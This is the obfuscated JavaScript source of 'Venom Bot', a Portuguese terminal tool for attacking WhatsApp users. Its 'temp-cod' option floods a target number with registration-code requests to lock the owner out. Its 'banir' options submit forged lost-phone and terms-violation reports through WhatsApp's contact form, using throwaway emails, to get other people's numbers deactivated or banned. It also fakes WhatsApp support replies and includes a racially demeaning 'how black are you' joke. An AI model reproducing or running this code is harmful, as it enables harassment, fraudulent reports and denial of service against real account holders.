const opn = require('opn')
var { color } = require('./dados/cores')
const malito = require('./dados/ban'),
  ownner = { user: '+55 97 8438-8524' },
  ascii = require('./dados/menu'),
  readline = require('readline-sync'),
  spin = require('spinnies'),
  fs = require('fs'),
  Spinner = require('cli-spinners'),
  axios = require('axios')
var { exec, spawn, execSync } = require('child_process'),
  {
    smsg,
    getGroupAdmins,
    formatp,
    tanggal,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    jsonformat,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    reSize,
  } = require('./dados/função'),
  moment = require('moment-timezone')
const API_KEY_SABRINA = 'VenomOfc'
var hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss'),
  data = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
const spinner = {
  interval: 150,
  frames: [
    'Conectando Venom Bot  \u280B',
    'Conectando Venom Bot  \u2819',
    'Conectando Venom Bot  \u2839',
    'Conectando Venom Bot  \u2838',
    'Conectando Venom Bot  \u283C',
    'Conectando Venom Bot  \u2834',
    'Conectando Vemom Bot  \u2826',
    'Conectando Venom Bot  \u2827',
    'Conectando Venom Bot  \u2807',
    'Conectando Venom Bot  \u280F',
  ],
}
let globalSpinner
const getGlobalSpinner = () => {
  if (!globalSpinner) {
    globalSpinner = new spin({
      color: 'pink',
      succeedColor: 'purple',
      spinner: spinner,
    })
  }
  return globalSpinner
}
spins = getGlobalSpinner(false)
const start = (_0x20bebb, _0x565115) => {
    spins.add('2', { text: _0x565115 })
  },
  infopd = (_0x1b9d74, _0x4a9e30) => {
    spins.update(_0x1b9d74, { text: _0x4a9e30 })
  },
  success = (_0x316574, _0x5f1273) => {
    spins.succeed(_0x316574, { text: _0x5f1273 })
  },
  close = (_0x4a61f1, _0x26125f) => {
    spins.fail(_0x4a61f1, { text: _0x26125f })
  }
async function main() {
  caminho_do_audio = './dados/audios/menu.opus'
  exec('mpv ' + caminho_do_audio)
  start('', ' ')
  await sleep(3000)
  success('2', 'Conectado com sucesso!')
  console.log(color(ascii.logo(), 'blue'))
  console.log(color(ascii.menu(), 'blue'))
  let _0x147924 = readline.question('Digite um comando : ')
  async function _0x2f38da() {
    const _0x3b8e94 = ['|', '/', '-', '\\']
    let _0x12d01e = 0
    setInterval(() => {
      process.stdout.write(
        '\r' + _0x3b8e94[_0x12d01e % _0x3b8e94.length] + ' Carregando...'
      )
      _0x12d01e++
    }, 20)
  }
  switch (_0x147924) {
    case 'desativar':
      console.clear(),
        console.log(
          ascii.aviso(
            'recurso criado para desativar/denúnciar numeros fakes. Não me responsabilizo por uso indevido.'
          )
        )
      let _0x4c8a1e = readline.question('numero: ')
      await malito.desativar(_0x4c8a1e), main()
      break
    case 'banir':
      console.clear(),
        console.log(
          ascii.aviso(
            'texto padrão base criado pelo \x1B[41;1;37m Venom Mods \x1B[0m  \x1B[31m'
          )
        )
      let _0x4466d0 = readline.question('numero: ')
      await malito.desbanir(_0x4466d0), main()
      break
    case 'temp-cod':
      {
        const _0x2071f8 = require('fs')
        let _0x368721 = readline.question(
            '[+] Digite o ddi do número, exemplo: 55\nDigite o ddi aki:   '
          ),
          _0x1cbb9f = readline.question(
            '[+] Digite o número do alvo, sem o ddi exemplo: 9784388523\nDigite o número aki:   '
          )
        console.clear()
        _0x2f38da()
        console.log(
          color(
            '\n\n\u203C️Aguade o Código do WhatsApp do alvo será desativado temporariamente\u203C️\n\nVerifique o número \u2705\n\n' +
              ('+' + _0x368721 + _0x1cbb9f) +
              '\n\nScript feita por Venom Mods\n\n',
            'red'
          )
        )
        await sleep(2000)
        prompt = require('prompt-sync')()
        gradient = require('gradient-string')
        pino = require('pino')
        const {
            default: _0x5a490a,
            useMultiFileAuthState: _0x5696c5,
          } = require('@VenomMods/baileys'),
          _0x39067b = JSON.parse(_0x2071f8.readFileSync('./numbers.json')),
          _0x259015 = async () => {
            const { state: _0x19c87e, saveCreds: _0x47db0a } = await _0x5696c5(
                '.Venom'
              ),
              _0x4054ba = _0x5a490a({
                auth: _0x19c87e,
                mobile: true,
                logger: pino({ level: 'silent' }),
              }),
              _0x5938d4 = async (_0x5b070e) => {
                const {
                  phoneNumber: _0x21822f,
                  ddi: _0x25af3a,
                  number: _0x531a6e,
                } = _0x5b070e
                while (true) {
                  try {
                    res = await _0x4054ba.requestRegistrationCode({
                      phoneNumber: '+' + _0x21822f,
                      phoneNumberCountryCode: _0x25af3a,
                      phoneNumberNationalNumber: _0x531a6e,
                      phoneNumberMobileCountryCode: 724,
                    })
                    b = res.reason === 'temporarily_unavailable'
                    if (b) {
                      setTimeout(async () => {
                        _0x5938d4(_0x5b070e)
                      }, 1000)
                      return
                    }
                  } catch (_0x1485c3) {
                    console.log(_0x1485c3)
                  }
                }
              }
            let _0x36db13 = _0x368721,
              _0x135fae = _0x1cbb9f,
              _0x1beaa3 = _0x36db13 + _0x135fae
            _0x39067b[_0x1beaa3] = {
              ddi: _0x36db13,
              number: _0x135fae,
            }
            _0x2071f8.writeFileSync(
              './numbers.json',
              JSON.stringify(_0x39067b, null, '\t')
            )
            _0x5938d4({
              phoneNumber: _0x1beaa3,
              ddi: _0x36db13,
              number: _0x135fae,
            })
          }
        _0x259015()
      }
      break
    case 'banirv1':
      {
        let _0x33330e = readline.question(
            '\n\n[+] Digite o número que deseja desbanir\n\nExemplo: 5597xxxxxxx\n\nDigite o número aqui: '
          ),
          _0x5f47a2 = _0x33330e
        console.clear()
        _0x2f38da()
        try {
          var _0x8badf3 = require('axios')
          let _0x50ae83 = await _0x8badf3.get(
              'https://www.whatsapp.com/contact/noclient/'
            ),
            _0x5beeb7 = await _0x8badf3.get(
              'https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'
            ),
            _0x58c0e3 = _0x50ae83.headers['set-cookie'].join('; ')
          const _0x391fb5 = require('cheerio')
          let _0x2c4be8 = _0x391fb5.load(_0x50ae83.data),
            _0x5a334f = _0x2c4be8('form'),
            _0x2e8c3b = new URL(
              _0x5a334f.attr('action'),
              'https://www.whatsapp.com'
            ).href,
            _0x4997ca = new URLSearchParams()
          _0x4997ca.append(
            'jazoest',
            _0x5a334f.find('input[name=jazoest]').val()
          )
          _0x4997ca.append('lsd', _0x5a334f.find('input[name=lsd]').val())
          _0x4997ca.append('step', 'submit')
          _0x4997ca.append('country_selector', '+')
          _0x4997ca.append('phone_number', '+' + _0x5f47a2)
          _0x4997ca.append('email', _0x5beeb7.data[0])
          _0x4997ca.append('email_confirm', _0x5beeb7.data[0])
          _0x4997ca.append('platform', 'ANDROID')
          _0x4997ca.append(
            'your_message',
            'Perdido/roubado: desative minha conta'
          )
          _0x4997ca.append('__user', '0')
          _0x4997ca.append('__a', '1')
          _0x4997ca.append('__csr', '')
          _0x4997ca.append('__req', '8')
          _0x4997ca.append('__hs', '19531.BP:whatsapp_www_pkg.2.0.0.0.0')
          _0x4997ca.append('dpr', '1')
          _0x4997ca.append('__ccg', 'UNKNOWN')
          _0x4997ca.append('__rev', '1007735016')
          _0x4997ca.append('__comment_req', '0')
          let _0x205433 = await _0x8badf3({
            url: _0x2e8c3b,
            method: 'POST',
            data: _0x4997ca,
            headers: { cookie: _0x58c0e3 },
          })
          console.log(
            color(
              '\n\nAguarde de 1 a 24 horas para que o número seja banido e aguarde \xB130 segundos para ver uma resposta por e-mail!!',
              'blue'
            )
          )
          console.log(
            color(
              '\n\n\u203C️Aviso\u203C️\n Não feche o termux e nem de inter ao usar este comsndo!\nCado fizer isso o banimento não funciona',
              'red'
            )
          )
          let _0x36391a = String(_0x205433.data)
          if (_0x36391a.includes('"payload":true')) {
            console.log(
              color(
                '\n\n##- suporte WhatsApp -##\n\nHa, Obrigado pelo seu povo. Desativamos sua conta do WhatsApp. Isso significa que sua conta foi removida e desativada temporariamente e será excluída automaticamente em 30 dias se você não registrar a conta novamente. Observação: a equipe de suporte ao cliente do WhatsApp não pode excluir sua conta manualmente. Durante o período de desligamento: \u2022 Seus contatos no WhatsApp ainda podem ver seu nome e foto do perfil. \u2022 Todas as pessoas para quem seus contatos podem enviar a conta permanecerá em estado pendente por até 30 dias. Se você deseja recuperar sua conta, registre-a novamente como O mais breve possível. Registre novamente sua conta inserindo 6 dígitos o código que você recebe via SMS ou chamada telefônica. Se você se registrar novamente restaure seu histórico de conversas em: Android | iPhone. arquivos, backups ou histórico de chamadas de contas excluídas. conta antes de ser excluída, você permanecerá em todas as conversas em grupo. Você terá a opção de recuperar seus dados. Saiba como Se você não registrar novamente sua conta, ela poderá ser excluída e esse processo não poderá ser revertido. Infelizmente, o WhatsApp não pode ajudá-lo a recuperar conversas, documentos, mídia Observação: se o seu dispositivo for perdido ou roubado, recomendamos entrar em contato com sua operadora de celular para bloquear o cartão SIM o mais rápido possível. Bloquear seu cartão SIM impede que outras pessoas registrem e acessem contas associadas ao seu cartão SIM. Poder de verão relacionado: \u26AB Para obter mais informações sobre a desativação de contas em telefones perdidos e roubados, leia este artigo. \u26AB Saiba mais sobre contas roubadas neste artigo. Se você tiver quaisquer outras perguntas ou preocupações, não hesite em nos contatar. Ficaremos felizes em ajudar!',
                'magenta'
              )
            )
          } else {
            if (_0x36391a.includes('"payload":false')) {
              console.log(
                color(
                  '\n\n##- WhatsApp Support -##\n\nObrigado por entrar em contato conosco. Entraremos em contato com você por e-mail, e pode levar até três dias úteis.',
                  'magenta'
                )
              )
            } else {
              reply(util.format(_0x205433.data))
            }
          }
        } catch (_0x15785e) {
          console.log('' + _0x15785e)
        }
      }
      break
    case 'banirv2':
      {
        let _0x4b21a8 = readline.question(
            '\n\n[+] Digite o número que deseja banir\n\nExemplo: 5597xxxxxxx\n\nDigite o número aqui: '
          ),
          _0x3abc0b = _0x4b21a8
        console.clear()
        _0x2f38da()
        try {
          var _0x8badf3 = require('axios')
          let _0x1c5ec2 = await _0x8badf3.get(
              'https://www.whatsapp.com/contact/noclient/'
            ),
            _0x30ca21 = await _0x8badf3.get(
              'https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'
            ),
            _0x1e8cd3 = _0x1c5ec2.headers['set-cookie'].join('; ')
          const _0xdb0926 = require('cheerio')
          let _0x1ebd77 = _0xdb0926.load(_0x1c5ec2.data),
            _0x23de0b = _0x1ebd77('form'),
            _0x12e032 = new URL(
              _0x23de0b.attr('action'),
              'https://www.whatsapp.com'
            ).href,
            _0x244cc3 = new URLSearchParams()
          _0x244cc3.append(
            'jazoest',
            _0x23de0b.find('input[name=jazoest]').val()
          )
          _0x244cc3.append('lsd', _0x23de0b.find('input[name=lsd]').val())
          _0x244cc3.append('step', 'submit')
          _0x244cc3.append('country_selector', '+')
          _0x244cc3.append('phone_number', '+' + _0x3abc0b)
          _0x244cc3.append('email', _0x30ca21.data[0])
          _0x244cc3.append('email_confirm', _0x30ca21.data[0])
          _0x244cc3.append('platform', 'ANDROID')
          _0x244cc3.append(
            'your_message',
            "I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work\nNumber : +" +
              _0x3abc0b
          )
          _0x244cc3.append('__user', '0')
          _0x244cc3.append('__a', '1')
          _0x244cc3.append('__csr', '')
          _0x244cc3.append('__req', '8')
          _0x244cc3.append('__hs', '19531.BP:whatsapp_www_pkg.2.0.0.0.0')
          _0x244cc3.append('dpr', '1')
          _0x244cc3.append('__ccg', 'UNKNOWN')
          _0x244cc3.append('__rev', '1007735016')
          _0x244cc3.append('__comment_req', '0')
          let _0x3308f6 = await _0x8badf3({
            url: _0x12e032,
            method: 'POST',
            data: _0x244cc3,
            headers: { cookie: _0x1e8cd3 },
          })
          console.log(
            color(
              '\n\nAguarde de 1 a 24 horas para que o número seja banido e aguarde \xB130 segundos para ver uma resposta por e-mail!!',
              'blue'
            )
          )
          console.log(
            color(
              '\n\n\u203C️Aviso\u203C️\n Não feche o termux e nem de inter ao usar este comsndo!\nCado fizer isso o banimento não funciona',
              'red'
            )
          )
          let _0x7835 = String(_0x3308f6.data)
          if (_0x7835.includes('"payload":true')) {
            console.log(
              color(
                '\n\n##- suporte WhatsApp -##\n\nParece que você está usando ou fazendo uma pergunta sobre uma versão não oficial do WhatsApp. Para garantir que você tenha acesso ao WhatsApp, verifique novamente seu número de telefone usando nosso aplicativo oficial, que pode ser baixado em nosso site: www.whatsapp.com/download Aplicativos não oficiais colocam em risco sua segurança e proteção, e não oferecemos suporte para eles. Aqui está o que pode acontecer se você usá-lo: Não há garantia de que suas mensagens ou dados, como sua localização ou os arquivos que você compartilha, sejam privados e seguros. A conta pode ser banida devido ao uso do aplicativo WhatsApp não oficial contra nossos Termos de Serviço. Seguem os termos de serviço do WhatsApp: Termos de serviço do WhatsApp 1. Uso do aplicativo Você concorda em usar o aplicativo WhatsApp ("Aplicativo") apenas para fins legais e de acordo com a lei aplicável. Você não tem permissão para usar o Aplicativo para fins ilegais ou proibir os direitos de terceiros. Você também concorda em não usar o Aplicativo para enviar, receber ou armazenar informações que violem a lei ou proíbam os direitos de terceiros. 2. Direitos autorais e marcas registradas Você concorda que todos os direitos autorais, marcas registradas e outros direitos de propriedade relacionados ao Aplicativo pertencem ao WhatsApp, Inc. e/ou suas recompensas. Você não tem permissão para usar ou modificar qualquer direito autoral, marca registrada ou outros direitos de propriedade sem a permissão expressa por escrito do WhatsApp, Inc. ou seu complemento. 3. Privacidade e segurança de dados O WhatsApp promete proteger sua privacidade e segurança de dados. Processaremos seus dados de acordo com nossa Política de Privacidade, que pode ser acessada em https://www.whatsapp.com/legal/#privacy-policy. Ao usar o Aplicativo, você concorda com nossa Política de Privacidade e dá seu consentimento para processar seus dados de acordo com nossa Política de Privacidade. 4. Limitação de responsabilidade O WhatsApp não é responsável por quaisquer perdas causadas pelo uso do Aplicativo por você ou por terceiros, incluindo, entre outros, perdas causadas por falha técnica ou danos ao equipamento, perda de dados, danos materiais ou outras perdas financeiras. 5. Alterações nos Termos de Serviço O WhatsApp reserva-se o direito de alterar estes Termos de Serviço a qualquer momento sem notificação prévia. Ao continuar a usar o Aplicativo após a entrada em vigor das alterações destes Termos de Serviço, você concorda em ficar vinculado à versão mais recente destes Termos de Serviço.',
                'magenta'
              )
            )
          } else {
            if (_0x7835.includes('"payload":false')) {
              console.log(
                color(
                  '\n\n##- Suporte WhatsApp -##\n\nObrigado por nos contato. Entraremos em contato com você por e-mail, e isso pode levar até três dias úteis.',
                  'blue'
                )
              )
            } else {
              console.log(util.format(_0x3308f6.data))
            }
          }
        } catch (_0x313e21) {
          console.log('' + _0x313e21)
        }
      }
      break
    case 'desban-analise':
      {
        let _0x2e53d2 = readline.question(
            '\n\n[+] Digite o número que deseja desbanir\n\nExemplo: 5597xxxxxxx\n\nDigite o número aqui: '
          ),
          _0x4d8920 = _0x2e53d2
        console.clear()
        _0x2f38da()
        try {
          var _0x8badf3 = require('axios')
          let _0x8a9ebf = await _0x8badf3.get(
              'https://www.whatsapp.com/contact/noclient/'
            ),
            _0x416d37 = await _0x8badf3.get(
              'https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'
            ),
            _0x324334 = _0x8a9ebf.headers['set-cookie'].join('; ')
          const _0x511aee = require('cheerio')
          let _0x55dfb9 = _0x511aee.load(_0x8a9ebf.data),
            _0x1d6d1d = _0x55dfb9('form'),
            _0x20bf33 = new URL(
              _0x1d6d1d.attr('action'),
              'https://www.whatsapp.com'
            ).href,
            _0x22ac6d = new URLSearchParams()
          _0x22ac6d.append(
            'jazoest',
            _0x1d6d1d.find('input[name=jazoest]').val()
          )
          _0x22ac6d.append('lsd', _0x1d6d1d.find('input[name=lsd]').val())
          _0x22ac6d.append('step', 'submit')
          _0x22ac6d.append('country_selector', '+')
          _0x22ac6d.append('phone_number', '+' + _0x4d8920)
          _0x22ac6d.append('email', _0x416d37.data[0])
          _0x22ac6d.append('email_confirm', _0x416d37.data[0])
          _0x22ac6d.append('platform', 'ANDROID')
          _0x22ac6d.append(
            'your_message',
            'Olá , eu estou sem acesso ao meu whatsapp, revisem está ação urgentemente, pois tal erro como este não pode ser tolerado , ou vir o orrer novamente.'
          )
          _0x22ac6d.append('__user', '0')
          _0x22ac6d.append('__a', '1')
          _0x22ac6d.append('__csr', '')
          _0x22ac6d.append('__req', '8')
          _0x22ac6d.append('__hs', '19531.BP:whatsapp_www_pkg.2.0.0.0.0')
          _0x22ac6d.append('dpr', '1')
          _0x22ac6d.append('__ccg', 'UNKNOWN')
          _0x22ac6d.append('__rev', '1007735016')
          _0x22ac6d.append('__comment_req', '0')
          let _0x5a748a = await _0x8badf3({
            url: _0x20bf33,
            method: 'POST',
            data: _0x22ac6d,
            headers: { cookie: _0x324334 },
          })
          console.log(
            color(
              '\n\nAguarde de 1 a 24 horas para que o número seja desbanido do análise e aguarde \xB130 segundos para ver uma resposta por e-mail!!',
              'blue'
            )
          )
          console.log(
            color(
              '\n\n\u203C️Aviso\u203C️\n Não feche o termux e nem de inter ao usar este comsndo!\nCado fizer isso o desbanimento não funciona',
              'red'
            )
          )
          let _0x414e6d = String(_0x5a748a.data)
          if (_0x414e6d.includes('"payload":true')) {
            console.log(
              color(
                '##- WhatsApp Support -##\n\nAgradecemos seu contato.\n\nEntendemos que você deseja contestar o banimento da sua conta do WhatsApp. Não é mais possível solicitar análises de contas por e-mail, mas você pode enviar sua contestação no próprio app do WhatsApp.\n\nO que fazer\n\nCertifique-se de que você está usando o app oficial do WhatsApp.\n\nSe esse não for o caso, baixe a versão do WhatsApp ou do WhatsApp Business app disponível em fontes confiáveis.\n\nAbra o app no seu celular usando a conta que foi banida e toque em Solicitar análise.\nInclua informações que expliquem por que você acredita que a conta foi banida indevidamente. Em seguida, toque em Enviar.\nEntraremos em contato quando a análise for concluída. Geralmente, esse processo leva 24 horas.\n\nNão responda a este e-mail. Nossa equipe não monitora essa caixa de entrada.\n\n--\nEquipe de Suporte do WhatsApp\n\nPara saber mais, acesse nossa Central de ajuda.\n\nMeu número: ' +
                  _0x4d8920 +
                  ' foi banido indevidamente isto foi um engano Fui clonado e rou\n'
              )
            )
          } else {
            if (_0x414e6d.includes('"payload":false')) {
              console.log(
                color(
                  '\n\n##- WhatsApp Support -##\n\nObrigado por entrar em contato conosco. Entraremos em contato com você por e-mail, e pode levar até três dias úteis.',
                  'magenta'
                )
              )
            } else {
              reply(util.format(_0x5a748a.data))
            }
          }
        } catch (_0x1e47f7) {
          console.log('' + _0x1e47f7)
        }
      }
      break
    case 'canal':
      ;(caminho_do_audio = './dados/audios/canal.opus'),
        exec('mpv ' + caminho_do_audio),
        console.clear(),
        _0x2f38da(),
        await opn('https://YouTube.com/@VenomModss'),
        console.log(
          color('\n\n\u2705Direciando ao canal do Venom..\n\n', 'blue')
        ),
        await sleep(9000),
        main()
      break
    case 'cassino':
      console.clear()
      var _0x125d46 = [
          '\uD83C\uDF4A : \uD83C\uDF52 : \uD83C\uDF50',
          '\uD83C\uDF52 : \uD83D\uDD14 : \uD83C\uDF4A',
          '\uD83C\uDF47 : \uD83C\uDF47 : \uD83C\uDF47',
          '\uD83C\uDF4A : \uD83C\uDF4B : \uD83D\uDD14',
          '\uD83D\uDD14 : \uD83C\uDF52 : \uD83C\uDF50',
          '\uD83D\uDD14 : \uD83C\uDF52 : \uD83C\uDF4A',
          '\uD83C\uDF4A : \uD83C\uDF4B : ??',
          '\uD83C\uDF50 : \uD83C\uDF52 : \uD83C\uDF4B',
          '\uD83C\uDF50 : \uD83C\uDF50 : \uD83C\uDF50',
          '\uD83C\uDF4A : \uD83C\uDF52 : \uD83C\uDF52',
          '\uD83D\uDD14 : \uD83D\uDD14 : \uD83C\uDF47',
          '\uD83C\uDF4C : \uD83C\uDF52 : \uD83D\uDD14',
          '\uD83C\uDF50 : \uD83D\uDD14 : \uD83D\uDD14',
          '\uD83C\uDF4A : \uD83C\uDF4B : \uD83C\uDF52',
          '\uD83C\uDF4B : \uD83C\uDF4B : \uD83C\uDF4C',
          '\uD83D\uDD14 : \uD83D\uDD14 : \uD83C\uDF47',
          '\uD83D\uDD14 : \uD83C\uDF50 : \uD83C\uDF47',
          '\uD83D\uDD14 : \uD83D\uDD14 : \uD83D\uDD14',
          '\uD83C\uDF52 : \uD83C\uDF52 : \uD83C\uDF52',
          '\uD83C\uDF4C : \uD83C\uDF4C : \uD83C\uDF4C',
        ],
        _0x499e8f = _0x125d46[Math.floor(Math.random() * _0x125d46.length)]
      if (
        _0x499e8f == '\uD83E\uDD51 : \uD83E\uDD51 : \uD83E\uDD51' ||
        _0x499e8f == '\uD83C\uDF49 : \uD83C\uDF49 : \uD83C\uDF49' ||
        _0x499e8f == '\uD83C\uDF53 : \uD83C\uDF53 : \uD83C\uDF53' ||
        _0x499e8f == '\uD83C\uDF4E : \uD83C\uDF4E : \uD83C\uDF4E' ||
        _0x499e8f == '\uD83C\uDF4D : \uD83C\uDF4D : \uD83C\uDF4D' ||
        _0x499e8f == '\uD83E\uDD5D : \uD83E\uDD5D : \uD83E\uDD5D' ||
        _0x499e8f == '\uD83C\uDF51 : \uD83C\uDF51 : \uD83C\uDF51' ||
        _0x499e8f == '\uD83E\uDD65 : \uD83E\uDD65 : \uD83E\uDD65' ||
        _0x499e8f == '\uD83C\uDF4B : \uD83C\uDF4B : \uD83C\uDF4B' ||
        _0x499e8f == '\uD83C\uDF50 : \uD83C\uDF50 : \uD83C\uDF50' ||
        _0x499e8f == '\uD83C\uDF4C : \uD83C\uDF4C : \uD83C\uDF4C' ||
        _0x499e8f == '\uD83C\uDF52 : \uD83C\uDF52 : \uD83C\uDF52' ||
        _0x499e8f == '\uD83D\uDD14 : \uD83D\uDD14 : \uD83D\uDD14' ||
        _0x499e8f == '\uD83C\uDF4A : \uD83C\uDF4A : \uD83C\uDF4A' ||
        _0x499e8f == '\uD83C\uDF47 : \uD83C\uDF47 : \uD83C\uDF47'
      ) {
        var _0x49d075 = 'Você ganhou!!!'
      } else {
        var _0x49d075 = 'Você perdeu...'
      }
      var _0x5b793b =
        '\n    CASSINO\n    \n\u250F\u2501\u2501\u2501\u2501\u276A\uD83C\uDFB0\u276B\u2501\u2501\u2501\u2501\n\u2523\u25BA ' +
        _0x499e8f +
        '\u25C4\u251B\n\u2517\u2501\u2501\u2501\u2501\u276A\uD83D\uDCB0\u276B\u2501\u2501\u2501\u2501\n\n' +
        _0x49d075 +
        '*'
      console.log(color('\n\n' + _0x5b793b + '\n\n', 'blue')),
        await sleep(5000),
        main()
      break
    case 'bebado':
      let _0x337abd = readline.question('\n\nDigite o seu nome: ')
      console.clear(),
        console.log(
          color(
            '\n\n\u2770 Pesquisando a ficha de bebado : ' +
              _0x337abd +
              ', aguarde... \u2771\n\n',
            'green'
          )
        ),
        (random = '' + Math.floor(Math.random() * 110)),
        (caption =
          'O quanto você é bebado? \n\n\u300C ' +
          _0x337abd +
          ' \u300DVocê é: \u2770 ' +
          random +
          '% \u2771 Bêbado \uD83E\uDD22\uD83E\uDD75\uD83E\uDD74'),
        await sleep(3000),
        console.clear(),
        console.log(color('\n\n' + caption + '\n\n', 'magenta')),
        await sleep(4000),
        main()
      break
    case 'preto':
      let _0x5db2d7 = readline.question('\n\nDigite o seu nome: ')
      console.clear(),
        console.log(
          color(
            '\n\n\u2770 Pesquisando a ficha de preto : ' +
              _0x5db2d7 +
              ', aguarde... \u2771\n\n',
            'green'
          )
        ),
        (random = '' + Math.floor(Math.random() * 110)),
        (pretotxt =
          'O quanto você é preto? \n\n\u300C ' +
          _0x5db2d7 +
          ' \u300DVocê é: \u2770 ' +
          random +
          '% \u2771 Preto \uD83E\uDD22'),
        await sleep(3000),
        console.clear(),
        console.log(color('\n\n' + pretotxt + '\n\n', 'magenta')),
        await sleep(4000),
        main()
      break
    case 'feio':
      let _0x413add = readline.question('\n\nDigite o seu nome: ')
      console.clear(),
        console.log(
          color(
            '\n\n\u2770 Pesquisando a ficha de feio : ' +
              _0x413add +
              ', aguarde... \u2771\n\n',
            'green'
          )
        ),
        (random = '' + Math.floor(Math.random() * 110)),
        (feiotxt =
          'O quanto você é feio? \n\n\u300C ' +
          _0x413add +
          ' \u300DVocê é: \u2770 ' +
          random +
          '% \u2771 Feio \uD83E\uDD22'),
        await sleep(3000),
        console.clear(),
        console.log(color('\n\n' + feiotxt + '\n\n', 'magenta')),
        await sleep(5000),
        main()
      break
    case 'tabela1':
      console.clear(),
        _0x2f38da(),
        console.log(
          color(
            '\n\n\xA0\xA0 ீ͜ஓீ͜\u0489͜͡\u2726By Venom Mods  \n\u066D̤֟\u2740\n A\u0488 B\u0488 C\u0488 D\u0488 E\u0488 F\u0488 G\u0488 H\u0488 I\u0488 J\u0488 K\u0488 L\u0488 M\u0488 N\u0488 O\u0488 P\u0488 Q\u0488 R\u0488 S\u0488 T\u0488 U\u0488 V\u0488 W\u0488 X\u0488 Y\u0488 Z\u0488\n ूT\u0488R\u0488 A\u0488V\u0488 A\u0488D\u0488O\u0488R\u0488  \nA\u0489 B\u0489 C\u0489 D\u0489 E\u0489 C\u0489 D\u0489 E\u0489 F\u0489 G\u0489H\u0489 I\u0489 J\u0489 K\u0489 L\u0489 M\u0489 N\u0489 O\u0489 P\u0489 Q\u0489 R\u0489 S\u0489 T\u0489 U\u0489 V\u0489 W\u0489 X\u0489 Y\u0489 Z\u0489\nৡৢ͜͡\u2726\u0488͜͡   ፝͜\n O\u0488  M\u0488 E\u0488 L H\u0488    \n ℬ ℰ ℯ ℱ ℊ ℋ ℎ ℐ ℒ ℓ ℳ ℴ \u2118 ℛ \nℭ \u212E ℌ ℑ ℜ ℨ\n M\u0488EN\u0488O\u0488R\u0488    S\u0488O\u0488L\u0488I\u0488T\u0488A\u0488R\u0488I\u0488O\u0488     \nE\u0488S\u0488T\u0488R\u0488EL\u0488A\u0488\n    \n丹 乃 匚 刀 モ 下 ム 卄 工 Ｊ Ｋ ㄥ 爪 れ 口 ㄗ Ｑ 尺 ち 匕 \u222A \u2228 山 メ ㄚ 乙v ๖ۣۜÄ ๖ۣۜÖ ๖ۣۜÜ\n\n ๖ۣۜ\u20AC ๖ۣۜ@ Ju\n๖ۣۜA ๖ۣۜB ๖ۣۜC ๖ۣۜD ๖ۣۜE ๖ۣۜF ๖ۣۜG ๖ۣۜH ๖ۣۜI ๖ۣۜJ ๖ۣۜK ๖ۣۜL ๖ۣۜM ๖ۣۜN ๖ۣۜO ๖ۣۜP ๖ۣۜQ ๖ۣۜR ๖ۣۜS ๖ۣۜT ๖ۣۜU ๖ۣۜW ๖ۣۜV ๖ۣۜX ๖ۣۜY ๖ۣۜZ\n A = Д \u2206 ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά ā\nB = ß в β ხ \u0E3F в \u2422 ๒ Ъ ъ ь\nC = \xA2 ς \xA9 ζ Ƈ Ɔ ʗ \u20A1 ૮ ح\nD = Ð \u2202 ð đ ๔ მ ძ ժ ɗ\nE = \xA3 Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯\nF = ƒ \u20A3 ﬄ ךּ דּ Ғ ક Ք\nG = Ģ \u20A2 ɠ ૬ ǥ Ҩ ҩ\nH = સ அ ħ ђ н Ћ Њ अ\u2560\u2563\nI = ϊ ΐ ذ ﻐ\xA0 ɩ ւ ɨ\nJ = נ ل Ţ ړ ਹ ﻮ ʝ ჟ a\nK = Қ ķ к Ҝ \u20AD К қ ҝ\nL = Ł ℓ Ļ ๋\u255DԼ\nM = ๓ ற м \u20A5 რ ო ɱ\nN = Ŋ ภ Պ ฑ η и ர Ɲ ห \u20AA ɳ מּ תּ \u20A6\nO = Ø ѳ ø ૭ σ \u0E4F ơ Θ Ф ठ \u263B\u263A θ Ө ɵ\nP = ק Þ ρ P๋ \u203D ρ ƿ ք թ ॐ\nQ = Ǫ ǫ գ\nR = г ŗ я \xAE Я Ŗ ɾ\nS = Ș ร ﻜ \xA7 Ş ֆ હ $ Ș Ƨ ى ş Տ ડ ઽ ૐ\nT = ł Ŧ \u2670 Ƭ τ \u2020\nU = ย џ ચ Ǔ Џ Ц Ū ப ʉ μ થ ય મ և υ ц\nV = \u221A ٧ ს\nX = א ﭏ Ҳ ҳ χ \xD7\nZ = Ƶ Հ ƶ ƺ .\nY = У ყ ﻻ צּ Ұ \xA5 У ұ ץ\n\u262C.      ﻜςσяÞΐ૭η\nԻ.  \u221AɩτơԻ   ﻜςσяÞΐ૭η\nԻ\n\u262C\u22B9\u22B1 \u22B0\u22B9ஐﻬﻬஐ๑\u273A \uFE3E\uD81A\uDCD4\u22B0 \u22B1\uD81A\uDCD4\n\n꣰ ꣱꣢꣩ ꣨꣯ \uA95F ꦀꦃ ꦄ ꦂꦶꦵ ꦴ꦳ꦿ ꧀ \uD81A\uDE30 \uD81A\uDDE7 \uD81A\uDDD0 \uD81A\uDD5F \uD81A\uDD78 \uD81A\uDD53 \uD81A\uDD4A \uD81A\uDD07 \uD81A\uDD0Dსɩτơર\uD81A\uDD0D \uD81A\uDD1D \uD81A\uDD1B \uD81A\uDCF4 \uD81A\uDCF3 \uD81A\uDCD4 \uD81A\uDCD2 \uD81A\uDCD8 \uD81A\uDC7C \uD81A\uDC4E \u0FC7 \u0FC5 ᪔ ᪘ᬽ\u269E\u269F\u269C\u269B \u269D \u2695 \u26E7 \u2741 \u2766 \u2765 \u2E19\u2E0E \u2E19 ꕘ\uA670\uA673꣦꣭꣪\n\n\u0F12 \uA9C1\uA9C2   \u269A  \u269A\n\n\n\u0DF4 ේ \u0E5B ๖ ຂ \u0F12\u0F3B \u0F17\xA0\xA0 ཹ\xA0\xA0\xA0\xA0\xA0 ཷཱུུ.\xA0 